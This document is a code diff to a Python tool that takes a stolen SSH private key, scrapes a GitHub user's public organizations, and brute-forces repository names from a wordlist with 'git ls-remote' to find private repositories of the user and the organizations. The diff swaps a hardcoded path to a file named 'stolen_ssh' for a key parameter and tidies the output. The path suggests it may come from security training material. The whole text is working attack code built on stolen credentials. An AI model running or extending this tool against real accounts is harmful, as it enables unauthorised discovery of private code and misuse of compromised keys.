@@ -18,7 +18,7 @@ def check_ssh_github_username(filepath):
             print(f"https://github.com/{extracted_username}")
             return True
 
-def fetch_user_orgs():
+def fetch_github_user_orgs():
 
     # Fetch the user's GitHub profile page
     url = f'https://github.com/{extracted_username}'
@@ -27,9 +27,9 @@ def fetch_user_orgs():
     if response.status_code == 200:
         # Use the regular expression to extract organization names
         organization_names = re.findall(r'data-hovercard-type="organization" data-hovercard-url="/orgs/([^/]+)/hovercard"', response.text)
-        print(f"\t👉 Public Organizations {extracted_username} is a part of: ", end="")
+        print(f"👉 Public Organizations {extracted_username} is a part of: ", end="")
         for org_name in organization_names:
-            print(org_name, end="|")
+            print(org_name, end=" |")
         return [organization_names, extracted_username]
     else:
         print(f"Failed to fetch the GitHub profile page. Status code: {response.status_code}")
@@ -37,6 +37,7 @@ def fetch_user_orgs():
 
 # Bruteforce the repository (to find private repos) by the user specified wordlist.
 def github_repo_bruteforce(extracted_username, orgs, wordlist, key):
+    read_key(key)
     PRIVATE_KEY=key
     read_key(wordlist)
     public_repos = {}
@@ -60,14 +61,15 @@ def github_repo_bruteforce(extracted_username, orgs, wordlist, key):
         else:
             public_repos[org]=org_public_repo
     print()
-    
+
     # Fuzzing for private repositories
     with open(wordlist, "r") as wordlist_file:
         print(f"🏃 Fuzzing repositories for the {extracted_username}...", end="")
         temp = []
         for line in wordlist_file:
             line = line.strip()
-            env = {'GIT_SSH_COMMAND': 'ssh -i /Users/cardinal/training/beyond-the-code/.ssh/ec/stolen_ssh -F /dev/null -o IdentitiesOnly=yes'}
+            ssh_git_command = f'ssh -i {PRIVATE_KEY} -F /dev/null -o IdentitiesOnly=yes'
+            env = {'GIT_SSH_COMMAND': ssh_git_command}
             result = sp.call(["git", "ls-remote", f"git@github.com:{extracted_username}/{line}.git", "-q"], env=env, stdout=sp.PIPE, stderr=sp.PIPE)
             if result == 0:
                 temp.append(line)
@@ -80,7 +82,8 @@ def github_repo_bruteforce(extracted_username, orgs, wordlist, key):
             temp = []
             for line in wordlist_file:
                 line = line.strip()
-                env = {'GIT_SSH_COMMAND': 'ssh -i /Users/cardinal/training/beyond-the-code/.ssh/ec/stolen_ssh -F /dev/null -o IdentitiesOnly=yes'}
+                ssh_git_command = f'ssh -i {PRIVATE_KEY} -F /dev/null -o IdentitiesOnly=yes'
+                env = {'GIT_SSH_COMMAND': ssh_git_command}
                 result = sp.call(["git", "ls-remote", f"git@github.com:{org}/{line}.git", "-q"], env=env, stdout=sp.PIPE, stderr=sp.PIPE)
                 if result == 0:
                     temp.append(line)
@@ -88,8 +91,8 @@ def github_repo_bruteforce(extracted_username, orgs, wordlist, key):
             print("Done.")
     
 
-    print("Private Repositories - ", end="")
+    print("----- Private Repositories - ", end="")
     print(private_repos)
 
-    print("Public Repositories - ", end="")
+    print("----- Public Repositories - ", end="")
     print(public_repos)
